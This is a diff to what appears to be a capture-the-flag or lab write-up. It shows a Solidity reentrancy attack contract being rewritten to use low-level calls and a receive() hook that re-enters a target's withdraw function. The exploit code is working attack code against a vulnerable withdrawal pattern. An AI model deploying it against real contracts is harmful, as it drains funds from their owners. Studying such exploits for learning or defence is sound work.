@@ -364,27 +364,24 @@ The vulnerable contract reduces balances after sending ETH via call.value(), whi
 pragma solidity ^0.8.0;
 
 contract ReentrancyAttacker {
-    Reentrance public target;
     uint256 public initialDeposit;
+    event Response(uint256 xxx);
+    event Response2(address target);
 
-    constructor(address payable _target) payable {
-        target = Reentrance(_target);
+    function attack(address payable target) external payable {
         initialDeposit = msg.value;
-        target.donate{value: initialDeposit}(address(this));
-    }
+        target.call{value:initialDeposit}(abi.encodeWithSignature("donate(address)", address(this)));
 
-    function attack() external {
-        target.withdraw(initialDeposit);
+        target.call(abi.encodeWithSignature("withdraw(uint256)", initialDeposit));
     }
 
     receive() external payable {
-        if (address(target).balance >= initialDeposit) {
-            target.withdraw(initialDeposit);
+        uint256 balance = initialDeposit;
+        if (msg.sender.balance < initialDeposit) {
+            balance = msg.sender.balance;
         }
-    }
-
-    function withdraw() external {
-        payable(msg.sender).transfer(address(this).balance);
+        if (balance > 0)
+            msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", balance));
     }
 }
 ```
